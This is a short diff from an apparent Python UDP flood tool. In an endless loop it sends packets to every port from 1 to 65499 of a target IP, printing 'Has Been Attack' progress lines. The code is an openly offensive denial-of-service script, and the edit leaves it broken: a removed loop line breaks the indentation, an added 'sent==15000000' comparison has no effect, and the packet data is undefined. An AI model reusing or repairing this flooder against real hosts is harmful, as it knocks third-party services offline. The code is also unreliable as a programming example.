@@ -50,9 +50,9 @@ time.sleep(3)
 while True:
     sent = 0
     for port in range(1, 65500):
-    for bytes in range(1, 65500):
         white.sendto(bytes, (ip, port))
         sent = sent + 1
+        sent==15000000
         print("\033[1;91mHas Been Attack ====> \033[1;32m%s \033[1;91m Has Been Sent Packet to =====> \033[1;32m%s \033[1;91mHas Been Attack Port =====> \033[1;32m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
